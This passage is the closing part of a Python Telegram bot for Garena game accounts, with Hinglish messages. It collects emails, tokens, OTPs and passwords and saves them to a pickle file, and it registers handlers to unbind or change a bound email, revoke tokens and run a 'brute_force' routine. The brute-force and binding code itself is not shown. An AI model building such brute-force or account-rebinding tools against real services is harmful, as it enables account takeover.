# ─── Utility Commands ─────────────────────────────────────────────────────────

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "📋 *Commands:*\n"
        "/start — Main menu\n"
        "/cancel — Operation cancel karo\n"
        "/clear — Saved credentials delete karo\n"
        "/ping — Bot status\n\n"
        "💡 *Tip:* Ek baar email/token enter karo —\n"
        "bot yaad rakhega aur automatically suggest karega!",
        parse_mode="Markdown",
        reply_markup=back_kb(),
    )


async def clear_creds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    context.user_data.pop("saved_email", None)
    context.user_data.pop("saved_access", None)
    await update.message.reply_text(
        "🗑️ Saved credentials delete ho gayi.\n\n/start — Main menu",
        reply_markup=back_kb(),
    )


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🟢 Bot online hai!", reply_markup=back_kb())

# ─── App Entry Point ──────────────────────────────────────────────────────────

def main() -> None:
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not token:
        raise RuntimeError("TELEGRAM_BOT_TOKEN is not set.")

    # PicklePersistence: user credentials survive bot restarts
    persistence = PicklePersistence(filepath="garena_bot_data.pkl")
    app = Application.builder().token(token).persistence(persistence).build()

    TEXT = filters.TEXT & ~filters.COMMAND

    entry_points = [
        CommandHandler("start", show_main_menu),
        CallbackQueryHandler(show_main_menu,    pattern="^back_main$"),
        CallbackQueryHandler(clear_creds,       pattern="^clear_creds$"),
        CallbackQueryHandler(add_email_start,   pattern="^add_email$"),
        CallbackQueryHandler(check_email_start, pattern="^check_email$"),
        CallbackQueryHandler(platform_start,    pattern="^check_platform$"),
        CallbackQueryHandler(cancel_email_start,pattern="^cancel_email$"),
        CallbackQueryHandler(unbind_start,      pattern="^unbind_email$"),
        CallbackQueryHandler(change_bind_start, pattern="^change_bind$"),
        CallbackQueryHandler(revoke_start,      pattern="^revoke_token$"),
        CallbackQueryHandler(bf_start,          pattern="^brute_force$"),
    ]

    conv = ConversationHandler(
        entry_points=entry_points,
        states={
            MAIN_MENU: [
                CallbackQueryHandler(clear_creds,        pattern="^clear_creds$"),
                CallbackQueryHandler(add_email_start,    pattern="^add_email$"),
                CallbackQueryHandler(check_email_start,  pattern="^check_email$"),
                CallbackQueryHandler(platform_start,     pattern="^check_platform$"),
                CallbackQueryHandler(cancel_email_start, pattern="^cancel_email$"),
                CallbackQueryHandler(unbind_start,       pattern="^unbind_email$"),
                CallbackQueryHandler(change_bind_start,  pattern="^change_bind$"),
                CallbackQueryHandler(revoke_start,       pattern="^revoke_token$"),
                CallbackQueryHandler(bf_start,           pattern="^brute_force$"),
            ],
            # ── Credential flow: email + token ───────────────────────────────
            CREDS_CONFIRM:   [CallbackQueryHandler(creds_confirm)],
            CREDS_NEW_EMAIL: [MessageHandler(TEXT, creds_new_email)],
            CREDS_NEW_ACCESS:[MessageHandler(TEXT, creds_new_access)],
            CREDS_SAVE_ASK:  [CallbackQueryHandler(creds_save_ask)],
            # ── Credential flow: token only ──────────────────────────────────
            CREDS_TOKEN_CONFIRM:  [CallbackQueryHandler(creds_token_confirm)],
            CREDS_TOKEN_NEW:      [MessageHandler(TEXT, creds_token_new)],
            CREDS_TOKEN_SAVE_ASK: [CallbackQueryHandler(creds_token_save_ask)],
            # ── Add Email ────────────────────────────────────────────────────
            ADD_OTP: [MessageHandler(TEXT, add_get_otp)],
            # ── Unbind Email ─────────────────────────────────────────────────
            UNBIND_METHOD: [CallbackQueryHandler(unbind_method)],
            UNBIND_OTP:    [MessageHandler(TEXT, unbind_get_otp)],
            UNBIND_PASS:   [MessageHandler(TEXT, unbind_get_pass)],
            # ── Change Bind Email ─────────────────────────────────────────────
            CHANGE_NEW_EMAIL: [MessageHandler(TEXT, change_get_new_email)],
            CHANGE_METHOD:    [CallbackQueryHandler(change_method)],
            CHANGE_OLD_OTP:   [MessageHandler(TEXT, change_get_old_otp)],
            CHANGE_PASS:      [MessageHandler(TEXT, change_get_pass)],
            CHANGE_NEW_OTP:   [MessageHandler(TEXT, change_get_new_otp)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_op),
            CommandHandler("start",  show_main_menu),
            CommandHandler("clear",  clear_creds_cmd),
        ],
        allow_reentry=True,
        persistent=True,
        name="garena_conv",
    )

    app.add_handler(conv)
    app.add_handler(CommandHandler("help",  help_command))
    app.add_handler(CommandHandler("ping",  ping))
    app.add_handler(CommandHandler("clear", clear_creds_cmd))

    base_url      = os.environ.get("WEBHOOK_BASE_URL")
    webhook_secret= os.environ.get("WEBHOOK_SECRET")

    if base_url and webhook_secret:
        port        = int(os.environ.get("PORT", "8000"))
        webhook_url = f"{base_url.rstrip('/')}/{webhook_secret}"
        print("Bot webhook mode mein chal raha hai.")
        app.run_webhook(
            listen="0.0.0.0",
            port=port,
            url_path=webhook_secret,
            webhook_url=webhook_url,
        )
    else:
        print("Bot polling mode mein chal raha hai (local).")
        app.run_polling()


if __name__ == "__main__":
    main()
